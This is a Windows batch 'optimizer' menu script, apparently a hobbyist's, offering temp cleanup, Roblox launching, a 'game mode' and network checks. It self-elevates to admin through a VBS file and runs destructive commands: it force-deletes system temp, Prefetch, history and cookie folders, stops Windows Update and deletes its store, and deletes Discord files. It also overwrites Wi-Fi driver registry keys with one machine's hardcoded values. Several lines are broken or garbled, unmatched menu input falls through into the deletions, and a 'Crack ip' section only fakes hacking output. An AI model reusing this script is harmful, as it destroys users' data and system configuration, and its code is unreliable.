:: make sure to get admin
:-------------------------------------
:: Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
:: If error flag set, we do not have admin.
:: If no admin, reqeust admin via VBS script
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
:: delete script after getting admin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
Mode 109 19
title cmd VV Bysiwat
@echo off
cls
color a
chcp 65001
echo Backup ???
SET /p choix="%%b[31m[%%b[33mWPARK%%b[31m]%%b[33m yes or No  >  "
if %choix%== yes Goto :BACKUP
if %choix%== no Goto :menu
:menu
cls
echo ══════════════════════════════════════════════════════════════════════════════════ 
echo 1 clean file
echo 2 remote
echo 3 roblox
echo 4 GameModeoff
echo 5 Gamemodeon
echo 6 recover Backup Notebook only
echo 7 shutdown
echo 8 Check ping
echo 9 COMPUTER Check
echo 10 delete Roblox
echo 11 BACKUP
echo 12 Full clean
echo ══════════════════════════════════════════════════════════════════════════════════
ping -n 2 127.0.0.1>nul
SET /p choix="%%b[31m[%%b[33mWPARK%%b[31m]%%b[33m PRESS NUMBER USE  >  "
if %choix%== 1 Goto :clean
if %choix%== 2 Goto :remoteZ
if %choix%== 3 Goto :roblox1
if %choix%== 4 Goto :Gamemodeoff
if %choix%== 5 Goto :Gamemodeon
if %choix%== 6 Goto :Notebook
if %choix%== 7 Goto :shd
if %choix%== 8 goto :ping
if %choix%== 9 goto :cpt
if %choix%== 10 goto :delete
if %choix%== 11 goto :BACKUP
if %choix%== 12 goto :fullclean
:clean
title Defrag Driv c
cls
chcp 65001
defrag c:
cls
title clear file
cleanmgr
cls
rd /s /q %temp%
ping -n 2 127.0.0.1>nul
cls
del /q/f/s %TEMP%\*
ping -n 2 127.0.0.1>nul
cls
md %temp%
ping -n 2 127.0.0.1>nul
cls
ping -n 2 127.0.0.1>nul
color c
/s /f /q c:\windows\temp\*.*
rd /s /q c:\windows\temp
md c:\windows\temp
del /s /f /q C:\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
rd /s /q %temp%
md %temp%
deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
@echo off
title Cop's Tweaks Pack /\ Clear Cache
cd/
@echo
del *.log /a /s /q /f
del /s /f /q c:\windows\temp\*.*
del /s /f /q C:\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
net stop wuauserv
net stop UsoSvc
rd /s /q C:\Windows\SoftwareDistribution
md C:\Windows\SoftwareDistribution
RD /S /Q %temp%
MKDIR %temp%
takeown /f "%temp%" /r /d y
takeown /f "C:\Windows\Temp" /r /d y
RD /S /Q C:\Windows\Temp
MKDIR C:\Windows\Temp
takeown /f "C:\Windows\Temp" /r /d y
takeown /f %temp% /r /d y
:DD
goto clean2

:cpt
dxdiag
ping -n 2 127.0.0.1>nul
msinfo32
ping -n 2 127.0.0.1>nul
hdwwiz
ping -n 2 127.0.0.1>nul
azman.msc
ping -n 2 127.0.0.1>nul
eventvwr.msc
ping -n 2 127.0.0.1>nul
dir c: /w/s
ping -n 2 127.0.0.1>nul
goto menu
:menue
cls
ping -n 2 127.0.0.1>nul

goto ping
ping -n 2 127.0.0.1>nul
:ping
title Check in ter net
title Question
echo Check inter net ???
pause
ping -n 2 127.0.0.1>nul
title Check in ter net
title Check ping facebook
ping www.facebook.com
cls
title Check ping titok
ping www.tiktok.com
title Check ping youtube
ping www.youtube.com
cls
title Check ping Roblox
ping www.roblox.com
cls
ping google.co.th
cls
title Check net
cls
echo Check FULL pinG ??
SET /p choix="%%b[31m[%%b[33mWPARK%%b[31m]%%b[33m yes or no  >  "
if %choix%== yes Goto :pua
if %choix%== no Goto :menu
:pua
netstat
goto menu


:clean2
title Scanner
cls
ping -n 2 127.0.0.1>nul
cls
title scan
ping -n 2 127.0.0.1>nul
sfc /scannow
goto menu
:remoteZ
cls
chcp 65001
title remoteZ
echo goto select
ping -n 2 127.0.0.1>nul
goto ALL

:ALL
cls
title select
echo select 
ping -n 2 127.0.0.1>nul
title Question
echo remote Shell type z          newtabcmd  type x         mspaint type c   4goto menu type v             
chcp 65001
if %choix%== z Goto :remoteShell
if %choix%== x Goto :newtabcmd
if %choix%== c Goto :mspaint
if %choix%== v Goto :menu
if %choix%== t Goto :Chackip
ping -n 2 127.0.0.1>nul
SET /p choix="%%b[31m[%%b[33mWPARK%%b[31m]%%b[33m select  >  "

goto ALL
:Shell
cls
title Shell
start powershell
goto menu

:remotet
cls
title remote
shutdown-i
goto menu

:newtabcmd
start cmd
goto menu
:roblox1
chcp 65001
cls
echo dowload roblox????
if %choix%== yes Goto :next
if %choix%== no Goto :roblox3
ping -n 2 127.0.0.1>nul
SET /p choix="%%b[31m[%%b[33mWPARK%%b[31m]%%b[33m yes or no  >  "
echo starting Roblox
cls
ping -n 2 127.0.0.1>nul
:next
goto roblox2
:roblox2
start https://www.roblox.com/download/client
pause
goto roblox3
:mspaint
title paint
start mspaint
goto menu

:roblox3
title Starting Roblox
cd C:\Users\siwat\Downloads
start RobloxPlayerInstaller.exe
ping -n 23 127.0.0.1>nul
TASKKILL /F /IM RobloxPlayerBeta.exe /T
ping -n 3 127.0.0.1>nul
cd C:\Program Files (x86)\Roblox\Versions\version-72b95a99cfcf4b7d
start RobloxPlayerBeta.exe
goto menu

:delete
cd C:\Program Files (x86)\Roblox\Versions
del version-72b95a99cfcf4b7d
goto menu
:remoteShell
title SHell
chcp 65001
cls
if %choix%== o Goto :Shell
if %choix%== m Goto :remotet
if %choix%== f Goto :Checkip
title Question
echo start powershell or remote?
echo 1remote 2powershell   3  ip
echo remote type o
echo ip type f
echo powershell type m
ping -n 2 127.0.0.1>nul
SET /p choix="%%b[31m[%%b[33mWPARK%%b[31m]%%b[33m select  >  "


:Checkip
title carcking
echo Check ip!!!!!!!!!!
ping -n 2 127.0.0.1>nul
echo Crack ip!!!!!!!!!!
echo Crack ip!!!!!!!!!!
echo Crack ip!!!!!!!!!!
echo Crack ip!!!!!!!!!!
echo Crack ip!!!!!!!!!!
ping -n 2 127.0.0.1>nul
echo Crack ip!!!!!!!!!!
echo Crack ip!!!!!!!!!!
echo Crack ip!!!!!!!!!!
ping -n 2 127.0.0.1>nul
echo Crack ip!!!!!!!!!!
ping -n 2 127.0.0.1>nul
echo Crack ip!!!!!!!!!!
ping -n 2 127.0.0.1>nul
cls
ipconfig
timeout 10
echo thank for use Crack ip
ping -n 6 127.0.0.1>nul
goto menu








:Gamemodeon
@echo off
title Gamemode on
cls
ping -n 4 127.0.0.1>nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "ConvertibleSlateMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "22" /f
ping -n 2 127.0.0.1>nul
del "%HOMEPATH%\Desktop\Discord.ink" /F /Q
del "%HOMEPATH%\Desktop\Discord.ink - Shortcut" /F /Q
del "%HOMEPATH%\Desktop\Update.exe" /F /Q
del "%HOMEPATH%\Desktop\Update.exe - Shortcut" /F /Q
del "%HOMEPATH%\Desktop\Discord.exe" /F /Q
del "%HOMEPATH%\Desktop\Discord.exe - Shortcut" /F /Q
del "%HOMEPATH%\appdata\Local\discord\Update.exe" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.309\Squirrel.exe" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.308\Squirrel.exe" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.307\Squirrel.exe" /F /Q
del "%HOMEPATH%\appdata\Local\discord\SquirrelSetup.log" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.309\SquirrelSetup.log" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.308\SquirrelSetup.log" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.307\SquirrelSetup.log" /F /Q
echo removing modules..
rd /s /q "%HOMEPATH%\appdata\Local\discord\Packages"
del "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_modules\397863cd8f\2\discord_game_sdk_x64.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_modules\397863cd8f\2\discord_game_sdk_x64.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_modules\397863cd8f\2\discord_game_sdk_x64.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_modules\397863cd8f\2\discord_game_sdk_x86.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_modules\397863cd8f\2\discord_game_sdk_x86.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_modules\397863cd8f\2\discord_game_sdk_x86.dll" /F /Q
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_cloudsync"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_cloudsync"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_cloudsync"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_dispatch"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_dispatch"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_dispatch"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_erlpack"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_erlpack"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_erlpack"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_game_utils"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_game_utils"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_game_utils"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_krisp"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_krisp"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_krisp"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_media"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_media"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_media"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_rpc"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_rpc"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_rpc"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_Spellcheck"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_Spellcheck"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_Spellcheck"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_overlay2"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_overlay2"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_overlay2"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "CortanaEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "SearchboxTaskbarMode" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWebOverMeteredConnections" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortanaAboveLock" /t REG_DWORD /d "0" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TermServicentVersion\Search" /v "AllowCortana" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "DriverDesc" /t REG_SZ /d "Qualcomm QCA9377 802.11ac Wireless Adapter" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "ProviderName" /t REG_SZ /d "Qualcomm Communications Inc." /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "DriverDateData" /t REG_BINARY /d "00c02dbfde41d601" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "DriverDate" /t REG_SZ /d "6-14-2020" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "DriverVersion" /t REG_SZ /d "12.0.0.953" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "InfPath" /t REG_SZ /d "oem32.inf" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "InfSection" /t REG_SZ /d "ATHR_DEV_OS63_988x_DE_NFA435_TF_1_1.ndi.NTamd64" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "IncludedInfs" /t REG_MULTI_SZ /d "machine.inf\0netvwifibus.inf\0pci.inf" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "MatchingDeviceId" /t REG_SZ /d "PCI\VEN_168C&DEV_0042&SUBSYS_18101028&REV_31" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "AddNewChannelfor11d" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "disableP2pLinkSpeedInd" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "AdaptiveSchedulerEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "UtfMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "UtfTraceLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "ftEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "wmmacEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "FWFileName" /t REG_SZ /d "qca9377_2_0.bin" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "DBFileName" /t REG_SZ /d "Data9377_2_0.msc" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "BoardDataFileName" /t REG_SZ /d "eeprom_qca9377_1p1_NFA435_olpc.bin" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "Txbfee" /t REG_DWORD /d "141" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "Txbfeeenable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "DpcTargetProcessors" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "DpcLockMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "gAntennaDiversity" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "SmUfCfgParaPolicy" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "wowEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "serviceMonWlan" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "NetBand" /t REG_DWORD /d "117440511" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "wModeSelect" /t REG_DWORD /d "117440511" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "VHT40WAR" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "stbcTxbfWar" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "CountryToEnable11ac" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "EnableHardwareRFKill" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "enablePPDULog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "YBForScanTimeout3Times" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "fastDlBinary" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "WarForEnablePmL1" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "*IfType" /t REG_DWORD /d "71" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "*MediaType" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "*PhysicalMediaType" /t REG_DWORD /d "9" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "BusType" /t REG_SZ /d "5" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "Characteristics" /t REG_DWORD /d "132" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "roamPolicy" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "D0PCEnable" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "StaPreferredBand" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "StaWirelessMode" /t REG_SZ /d "12" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "IfTypePreStart" /t REG_DWORD /d "71" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "InstallTimeStamp" /t REG_BINARY /d "e7070a00050014000a000f0018009801" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "PnPCapabilities" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "PortAuthReceiveAuthorizationState" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "PortAuthSendAuthorizationState" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "PortAuthReceiveControlState" /t REG_DWORD /d "2" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "PortAuthSendControlState" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "DeviceInstanceID" /t REG_SZ /d "PCI\VEN_168C&DEV_0042&SUBSYS_18101028&REV_31\4&345942d6&0&00E0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "ComponentId" /t REG_SZ /d "PCI\VEN_168C&DEV_0042&SUBSYS_18101028&REV_31" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "NetCfgInstanceId" /t REG_SZ /d "{E8690919-717E-4DB4-9086-CCA7FBF954C5}" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "NetLuidIndex" /t REG_DWORD /d "32768" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "PldrCapability" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "QcFwVersion" /t REG_SZ /d "98" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "QcHwVersion" /t REG_SZ /d "3.1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "*WdiRscIPv4" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "*WdiRscIPv6" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "SoftwareRadioOff" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "radioEnable" /t REG_DWORD /d "1" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "g11bNicState" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Linkage" /v "RootDevice" /t REG_MULTI_SZ /d "{E8690919-717E-4DB4-9086-CCA7FBF954C5}" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Linkage" /v "Export" /t REG_MULTI_SZ /d "\Device\{E8690919-717E-4DB4-9086-CCA7FBF954C5}" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Linkage" /v "UpperBind" /t REG_MULTI_SZ /d "lltdio\0MsLldp\0Ndisuio\0RasPppoe\0RDMANDK\0rspndr\0Tcpip\0Tcpip6" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Linkage" /v "FilterList" /t REG_MULTI_SZ /d "{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0000\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{3BFD7820-D65C-4C1B-9FEA-983A019639EA}-0000\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0001\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{5CBF81BF-5055-47CD-9055-A76B2B4E3698}-0000\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0002\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{E475CF9A-60CD-4439-A75F-0079CE0E18A1}-0000\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0003\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{B5F4D659-7DAA-4565-8E41-BE220ED60542}-0000\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0004\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{B70D6460-3635-4D42-B866-B8AB1A24454C}-0000\0{E8690919-717E-4DB4-9086-CCA7FBF954C5}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0005" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi" /v "Service" /t REG_SZ /d "Qcamain10x64" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Interfaces" /v "UpperRange" /t REG_SZ /d "ndis5" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Interfaces" /v "LowerRange" /t REG_SZ /d "wlan,ethernet,vwifi" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\D0PCEnable" /v "ParamDesc" /t REG_SZ /d "D0 PacketCoalescing" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\D0PCEnable" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\D0PCEnable" /v "Default" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\D0PCEnable\enum" /v "0" /t REG_SZ /d "Disable" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\D0PCEnable\enum" /v "1" /t REG_SZ /d "Enable" /f
